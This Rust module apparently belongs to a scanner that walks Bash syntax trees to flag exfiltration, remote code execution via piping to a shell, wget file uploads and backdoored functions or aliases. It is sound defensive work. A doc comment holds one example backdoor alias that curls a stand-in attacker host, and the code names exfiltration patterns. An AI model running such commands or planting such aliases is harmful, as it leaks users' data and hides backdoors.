//! Bash AST checks: pipelines, redirects, substitutions, function and alias backdoors.

use tree_sitter::Node;

use crate::interpreter::{check_interpreter_inline_code, check_shell_inline_code};
use crate::patterns;
use crate::util::{
    get_command_name, has_sensitive_path, has_sensitive_path_expanded, is_interpreter,
    is_network_sink, is_sensitive_source_cmd, is_shell_interpreter, node_text, strip_quotes,
};

pub(crate) fn check_node(node: Node, source: &[u8]) -> Option<String> {
    match node.kind() {
        "pipeline" => check_pipeline(node, source),
        "command" => check_command(node, source),
        "redirected_statement" => check_redirect(node, source),
        "function_definition" => check_function_definition(node, source),
        _ => {
            let mut cursor = node.walk();
            for child in node.children(&mut cursor) {
                if let Some(reason) = check_node(child, source) {
                    return Some(reason);
                }
            }
            None
        }
    }
}

fn check_pipeline(node: Node, source: &[u8]) -> Option<String> {
    let child_count = node.child_count();
    if child_count < 2 {
        return None;
    }

    let mut has_sensitive_source = false;
    let mut has_network_source = false;
    let mut network_source_name = "";
    let mut cursor = node.walk();

    for child in node.children(&mut cursor) {
        let cmd_name = get_command_name(child, source);

        if let Some(name) = cmd_name {
            if has_sensitive_source && is_network_sink(name) {
                return Some(format!(
                    "Pipe from sensitive source to network sink '{name}'"
                ));
            }

            if has_network_source && is_shell_interpreter(name) {
                return Some(format!(
                    "Pipe from network source '{network_source_name}' to shell interpreter '{name}' (remote code execution)"
                ));
            }

            if is_sensitive_source_cmd(name) {
                has_sensitive_source = true;
            }
            if is_network_sink(name) {
                has_network_source = true;
                network_source_name = name;
            }
        }

        if !has_sensitive_source && command_has_sensitive_path(child, source) {
            has_sensitive_source = true;
        }
    }

    let mut cursor2 = node.walk();
    for child in node.children(&mut cursor2) {
        if let Some(reason) = check_node(child, source) {
            return Some(reason);
        }
    }

    None
}

fn check_command(node: Node, source: &[u8]) -> Option<String> {
    let cmd_name = get_command_name(node, source)?;

    if is_network_sink(cmd_name) {
        if cmd_name == "wget" {
            if let Some(reason) = check_wget_post_file(node, source) {
                return Some(reason);
            }
        }

        if let Some(reason) = check_command_substitution_in_args(node, source, cmd_name) {
            return Some(reason);
        }

        if let Some(reason) = check_at_file_args(node, source, cmd_name) {
            return Some(reason);
        }

        if command_has_sensitive_path(node, source) {
            return Some(format!(
                "Network sink '{cmd_name}' with sensitive file argument"
            ));
        }

        if has_suspicious_url(node, source) {
            return Some(format!(
                "Network sink '{cmd_name}' targeting suspicious destination"
            ));
        }
    }

    if is_interpreter(cmd_name) {
        if let Some(reason) = check_interpreter_inline_code(node, source, cmd_name) {
            return Some(reason);
        }
    }

    if is_shell_interpreter(cmd_name) {
        if let Some(reason) = check_shell_inline_code(node, source, cmd_name) {
            return Some(reason);
        }
    }

    if cmd_name == "busybox" {
        if let Some(reason) = check_busybox_shell(node, source) {
            return Some(reason);
        }
    }

    if cmd_name == "alias" {
        if let Some(reason) = check_alias_definition(node, source) {
            return Some(reason);
        }
    }

    let mut cursor = node.walk();
    for child in node.children(&mut cursor) {
        if child.kind() != "command" {
            if let Some(reason) = check_node(child, source) {
                return Some(reason);
            }
        }
    }

    None
}

fn check_redirect(node: Node, source: &[u8]) -> Option<String> {
    let mut has_sink = false;
    let mut sink_name = "";
    let mut has_input_redirect_sensitive = false;

    let mut cursor = node.walk();
    for child in node.children(&mut cursor) {
        match child.kind() {
            "command" => {
                if let Some(name) = get_command_name(child, source) {
                    if is_network_sink(name) {
                        has_sink = true;
                        sink_name = name;
                    }
                }
            }
            "file_redirect" => {
                check_file_redirect(child, source, &mut has_input_redirect_sensitive);
            }
            _ => {}
        }
    }

    if has_sink && has_input_redirect_sensitive {
        return Some(format!(
            "Input redirect of sensitive file to network sink '{sink_name}'"
        ));
    }

    let mut cursor2 = node.walk();
    for child in node.children(&mut cursor2) {
        if let Some(reason) = check_node(child, source) {
            return Some(reason);
        }
    }

    None
}

fn check_file_redirect(node: Node, source: &[u8], has_sensitive: &mut bool) {
    let mut cursor = node.walk();
    let mut is_input = false;

    for child in node.children(&mut cursor) {
        let text = node_text(child, source);
        if text == "<" {
            is_input = true;
        }
        if is_input {
            let matched = match child.kind() {
                "word" => has_sensitive_path(text),
                "concatenation" | "simple_expansion" | "expansion" => {
                    has_sensitive_path(text) || has_sensitive_path_expanded(text)
                }
                _ => false,
            };
            if matched {
                *has_sensitive = true;
                return;
            }
        }
    }
}

/// Flags function bodies that exfiltrate (backdoored helpers).
fn check_function_definition(node: Node, source: &[u8]) -> Option<String> {
    let mut func_name = "";
    let mut cursor = node.walk();
    for child in node.children(&mut cursor) {
        if child.kind() == "word" {
            func_name = node_text(child, source);
            break;
        }
    }

    let mut cursor2 = node.walk();
    for child in node.children(&mut cursor2) {
        if child.kind() == "compound_statement" {
            if let Some(reason) = check_node(child, source) {
                return Some(format!(
                    "Function '{func_name}' definition contains exfiltration: {reason}"
                ));
            }
        }
    }

    None
}

/// Flags aliases whose value exfiltrates, e.g. `alias ls='curl evil.com; ls'`.
fn check_alias_definition(node: Node, source: &[u8]) -> Option<String> {
    let mut cursor = node.walk();

    for child in node.children(&mut cursor) {
        if matches!(
            child.kind(),
            "word" | "string" | "raw_string" | "ansi_c_string" | "concatenation"
        ) {
            let text = unquote_shell_word(node_text(child, source));

            if let Some((alias_name, alias_value)) = text.split_once('=') {
                let value = unquote_shell_word(alias_value);

                if let Ok(Some(tree)) = crate::parse_bash(value) {
                    if let Some(reason) = check_node(tree.root_node(), value.as_bytes()) {
                        return Some(format!(
                            "Alias '{alias_name}' contains exfiltration: {reason}"
                        ));
                    }
                }
            }
        }
    }
    None
}

/// Strip one layer of `'...'`, `"..."`, `$'...'` or `$"..."` quoting.
fn unquote_shell_word(text: &str) -> &str {
    let text = match text.strip_prefix('$') {
        Some(rest) if rest.starts_with(['\'', '"']) => rest,
        _ => text,
    };
    strip_quotes(text)
}

fn check_command_substitution_in_args(
    node: Node,
    source: &[u8],
    sink_name: &str,
) -> Option<String> {
    let mut cursor = node.walk();
    for child in node.children(&mut cursor) {
        if let Some(reason) = find_sensitive_command_substitution(child, source, sink_name) {
            return Some(reason);
        }
    }
    None
}

fn find_sensitive_command_substitution(
    node: Node,
    source: &[u8],
    sink_name: &str,
) -> Option<String> {
    if node.kind() == "command_substitution" {
        let mut cursor = node.walk();
        for child in node.children(&mut cursor) {
            if child.kind() == "command" {
                if let Some(name) = get_command_name(child, source) {
                    if is_sensitive_source_cmd(name) || command_has_sensitive_path(child, source) {
                        return Some(format!(
                            "Command substitution with sensitive source in '{sink_name}' arguments"
                        ));
                    }
                }
            }
        }
    }

    // substitutions can nest inside strings
    let mut cursor = node.walk();
    for child in node.children(&mut cursor) {
        if let Some(reason) = find_sensitive_command_substitution(child, source, sink_name) {
            return Some(reason);
        }
    }
    None
}

/// `wget --post-file`/`--body-file` always upload a local file, so flag regardless of path.
fn check_wget_post_file(node: Node, source: &[u8]) -> Option<String> {
    let mut cursor = node.walk();
    for child in node.children(&mut cursor) {
        let text = node_text(child, source);
        if text.starts_with("--post-file") || text.starts_with("--body-file") {
            let flag = text.split('=').next().unwrap_or(text);
            return Some(format!(
                "wget '{flag}' uploads local file contents to remote URL (data exfiltration)"
            ));
        }
    }
    None
}

fn check_at_file_args(node: Node, source: &[u8], cmd_name: &str) -> Option<String> {
    let mut cursor = node.walk();
    for child in node.children(&mut cursor) {
        if matches!(
            child.kind(),
            "word" | "concatenation" | "simple_expansion" | "expansion"
        ) {
            let text = node_text(child, source);
            if let Some(path) = text.strip_prefix('@') {
                if has_sensitive_path(path) || has_sensitive_path_expanded(path) {
                    return Some(format!(
                        "Network sink '{cmd_name}' reading sensitive file via @-prefix"
                    ));
                }
            }
        }
    }
    None
}

fn command_has_sensitive_path(node: Node, source: &[u8]) -> bool {
    let mut cursor = node.walk();
    for child in node.children(&mut cursor) {
        let text = node_text(child, source);
        match child.kind() {
            "word" | "string" | "raw_string" if has_sensitive_path(text) => return true,
            "concatenation" | "simple_expansion" | "expansion"
                if has_sensitive_path(text) || has_sensitive_path_expanded(text) =>
            {
                return true;
            }
            _ => {}
        }
    }
    false
}

fn has_suspicious_url(node: Node, source: &[u8]) -> bool {
    let mut cursor = node.walk();
    for child in node.children(&mut cursor) {
        let text = node_text(child, source);
        if is_suspicious_url(text) {
            return true;
        }
        if child.child_count() > 0 && has_suspicious_url(child, source) {
            return true;
        }
    }
    false
}

fn is_suspicious_url(text: &str) -> bool {
    patterns::has_exfil_domain(text) || is_ip_url(text)
}

fn is_ip_url(text: &str) -> bool {
    let authority = text
        .strip_prefix("http://")
        .or_else(|| text.strip_prefix("https://"))
        .unwrap_or(text)
        .split('/')
        .next()
        .unwrap_or(text);

    if let Some(bracketed) = authority.strip_prefix('[') {
        return bracketed.split(']').next().is_some_and(|h| {
            h.parse::<std::net::Ipv6Addr>()
                .is_ok_and(|ip| !crate::util::is_private_ipv6(ip))
        });
    }

    authority
        .split(':')
        .next()
        .unwrap_or(authority)
        .parse::<std::net::Ipv4Addr>()
        .is_ok_and(|ip| !crate::util::is_private_ipv4(ip))
}

/// `busybox sh -c ...`: re-parse like `sh -c`.
fn check_busybox_shell(node: Node, source: &[u8]) -> Option<String> {
    let applet = node.child_by_field_name("argument")?;
    if !is_shell_interpreter(strip_quotes(node_text(applet, source))) {
        return None;
    }
    check_shell_inline_code(node, source, "busybox")
}

#[cfg(test)]
mod tests {
    use rstest::rstest;

    use super::*;

    #[rstest]
    #[case::single("'a b'", "a b")]
    #[case::double("\"a b\"", "a b")]
    #[case::ansi_c("$'a b'", "a b")]
    #[case::translated("$\"a b\"", "a b")]
    #[case::variable("$a", "$a")]
    #[case::bare("a", "a")]
    fn unquotes_shell_word(#[case] input: &str, #[case] expected: &str) {
        assert_eq!(unquote_shell_word(input), expected);
    }
}
